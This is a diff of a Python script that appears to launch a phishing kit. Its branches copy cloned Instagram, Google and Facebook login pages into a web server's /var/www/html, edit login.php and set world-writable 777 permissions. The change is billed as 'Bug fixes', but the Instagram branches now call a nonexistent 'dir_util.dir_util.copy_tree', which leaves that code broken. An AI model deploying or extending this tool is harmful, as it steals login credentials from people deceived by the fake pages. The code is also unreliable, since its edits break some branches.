@@ -10,7 +10,7 @@
 
 
 
-# version 2.2: - Small adjustments
+# version 2.3: - Bug fixes
 
 # Please update version number each time we update
 
@@ -21,7 +21,7 @@ try:
     from os import system, getcwd, geteuid
     from time import sleep
     from socket import create_connection, gethostname, gethostbyname
-    from distutils.dir_util import copy_tree
+    from distutils import dir_util
 except ImportError:
     print("\033[31;1m" + "[!] Import Error, Aborting!")
     print("[!] Please run: \"chmod +x install.sh && ./install.sh\"\033[0m") # Command to run install.sh # 
@@ -70,7 +70,7 @@ def warning(): # Banner #
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v2.2
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v2.3
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
@@ -160,7 +160,7 @@ def banner():
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v2.2
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v2.3
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
@@ -233,10 +233,10 @@ def main():
             print(green + '[+] Cleaning /Server/www/')
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
+            dir_util.dir_util.copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
             redirect() # Redirect Prompt line:145 #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            dir_util.dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
             sleep(0.1)
             system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
@@ -273,10 +273,10 @@ def main():
             print(green + '[+] Cleaning /Server/www/')
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
+            dir_util.dir_util.copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
             redirect() # Redirect Prompt line:145 #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            dir_util.dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
             sleep(0.1)
             system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
@@ -313,10 +313,10 @@ def main():
             print(green + '[+] Cleaning /Server/www/')
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
+            dir_util.dir_util.copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
             redirect() # Redirect Prompt line:145 #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            dir_util.dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
             sleep(0.1)
             system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
@@ -351,10 +351,10 @@ def main():
             print(green + '[+] Cleaning /Server/www/')
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
+            dir_util.dir_util.copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
             redirect() # Redirect Prompt line:145 #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            dir_util.dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
             sleep(0.1)
             system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
@@ -405,10 +405,10 @@ def main():
             print(green + '[+] Cleaning /Server/www/')
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
+            dir_util.copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
             redirect() # Redirect Prompt line:145 #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
             sleep(0.1)
             system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
@@ -445,10 +445,10 @@ def main():
             print(green + '[+] Cleaning /Server/www/') 
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
+            dir_util.copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
             redirect() # Redirect Prompt line:145 #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
             sleep(0.1)
             system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
@@ -485,10 +485,10 @@ def main():
             print(green + '[+] Cleaning /Server/www/')
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
+            dir_util.copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
             redirect() # Redirect Prompt line:145 #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
             sleep(0.1)
             system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
@@ -525,10 +525,10 @@ def main():
             print(green + '[+] Cleaning /Server/www/')
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
+            dir_util.copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
             redirect() # Redirect Prompt line:145 #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
             sleep(0.1)
             system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
@@ -579,10 +579,10 @@ def main():
             print(green + '[+] Cleaning /Server/www/')
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
+            dir_util.copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
             redirect() # Redirect Prompt line:145 #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
             sleep(0.1)
             system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
@@ -619,10 +619,10 @@ def main():
             print(green + '[+] Cleaning /Server/www/') 
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
+            dir_util.copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
             redirect() # Redirect Prompt line:145 #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
             sleep(0.1)
             system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
@@ -659,10 +659,10 @@ def main():
             print(green + '[+] Cleaning /Server/www/')
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
+            dir_util.copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
             redirect() # Redirect Prompt line:145 #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
             sleep(0.1)
             system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
@@ -699,10 +699,10 @@ def main():
             print(green + '[+] Cleaning /Server/www/')
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
+            dir_util.copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
             redirect() # Redirect Prompt line:145 #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
             sleep(0.1)
             system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
